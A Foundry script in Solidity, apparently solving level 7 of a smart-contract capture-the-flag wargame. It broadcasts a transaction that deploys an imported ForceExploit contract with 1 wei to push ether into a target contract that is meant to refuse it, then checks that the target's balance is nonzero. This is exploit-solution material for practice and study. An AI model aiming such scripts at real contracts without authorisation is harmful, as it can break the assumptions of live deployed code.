pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {ForceExploit} from "../src/Level07Exploit.sol";

contract Level07Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress), "Solution failed");
    }

    function exploit(address _target) private {
        ForceExploit e = new ForceExploit{value: 1 wei}(payable(_target));
        console.log("exploit address:", address(e));
    }

    function exploitWithoutConstructor(address _target) private {
        ForceExploit e = new ForceExploit(payable(0));
        console.log("exploit address:", address(e));
        e.exploit{value: 1 wei}(payable(_target));
    }

    function levelDone(address _target) private view returns (bool) {
        return _target.balance > 0;
    }
}
